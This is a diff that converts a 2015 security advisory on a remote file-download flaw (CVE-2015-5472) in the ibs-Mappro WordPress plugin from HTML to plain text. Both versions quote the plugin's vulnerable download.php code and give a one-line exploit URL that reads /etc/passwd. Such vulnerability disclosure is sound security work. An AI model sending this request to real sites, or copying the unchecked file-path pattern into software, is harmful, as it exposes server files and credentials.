@@ -1,48 +1,31 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 137&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plugin&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-07-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/ibs-mappro/">https://wordpress.org/plugins/ibs-mappro/</a>"&gt;<a href="https://wordpress.org/plugins/ibs-mappro/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/ibs-mappro/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Hmoore71&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-07-08&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; Contacted via webform&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;IBS Mappro is a comprehensive map creator, editor, and view generator based on the Google Maps API v3 and supports kml, kmz, and gpx map files.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;the download.php script allows any remote user to download files off of the server:
-if (isset($_GET)) {
-</p><p>    $filename = $<u>GET[&amp;#039;file&amp;#039;];
-    $info = pathinfo($filename);<br/>
-    $name = $info[&amp;#039;basename&amp;#039;];
-    if (file</u>exists($filename)) {
-</p><pre>
-        header(&amp;#039;Set-Cookie: fileDownload=true; path=/&amp;#039;);
-        header(&amp;#039;Cache-Control: max-age=60, must-revalidate&amp;#039;);
-        header(&amp;#039;Content-Disposition: attachment; filename=&amp;quot;&amp;#039; . $title . &amp;#039;-&amp;#039; . $timestamp . &amp;#039;.csv&amp;quot;&amp;#039;);
-        header(&amp;#039;Content-Description: File Transfer&amp;#039;);
-        header(&amp;#039;Content-Type: application/octet-stream&amp;#039;);
-        header(&amp;#039;Content-Disposition: attachment; filename=&amp;quot;&amp;#039; . $name . &amp;#039;&amp;quot;&amp;#039;);
-        header(&amp;#039;Content-Transfer-Encoding: binary&amp;#039;);
-        header(&amp;#039;Expires: 0&amp;#039;);
-        header(&amp;#039;Cache-Control: must-revalidate, post-check=0, pre-check=0&amp;#039;);
-        header(&amp;#039;Pragma: public&amp;#039;);
-        header(&amp;#039;Content-Length: &amp;#039; . filesize($filename));
-        ob_clean();
-        flush();
-        readfile($filename);
-        exit;
-    } else {
-        die;
-</pre>
-<p>    }<br/>
-} else {
-</p><p>    die;<br/>
-}<br/>
-?&amp;gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-5472&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=137"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//example.com/wp-content/plugins/ibs-mappro/lib/download.php?file=/etc/passwd&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;
-&lt;/html&gt;</p>
-
-</body>
-</html>
+                               Advisory #: 137
+Title: Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plugin
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-07-08
+Download Site: https://wordpress.org/plugins/ibs-mappro/
+Vendor:Hmoore71
+Vendor Notified: 2015-07-08
+Vendor Contact: Contacted via webform
+Description: IBS Mappro is a comprehensive map creator, editor, and view
+generator based on the Google Maps API v3 and supports kml, kmz, and gpx map
+files.
+Vulnerability:
+the download.php script allows any remote user to download files off of the
+server: if (isset($_GET)) { $filename = $_GET['file']; $info = pathinfo
+($filename); $name = $info['basename']; if (file_exists($filename)) { header
+('Set-Cookie: fileDownload=true; path=/'); header('Cache-Control: max-age=60,
+must-revalidate'); header('Content-Disposition: attachment; filename="' .
+$title . '-' . $timestamp . '.csv"'); header('Content-Description: File
+Transfer'); header('Content-Type: application/octet-stream'); header('Content-
+Disposition: attachment; filename="' . $name . '"'); header('Content-Transfer-
+Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-
+revalidate, post-check=0, pre-check=0'); header('Pragma: public'); header
+('Content-Length: ' . filesize($filename)); ob_clean(); flush(); readfile
+($filename); exit; } else { die; } } else { die; } ?>
+CVE-2015-5472
+JSON:Export
+Exploit Code:
+   1. http://example.com/wp-content/plugins/ibs-mappro/lib/download.php?file=/
+      etc/passwd
+Screen Shots:
+Advisory:
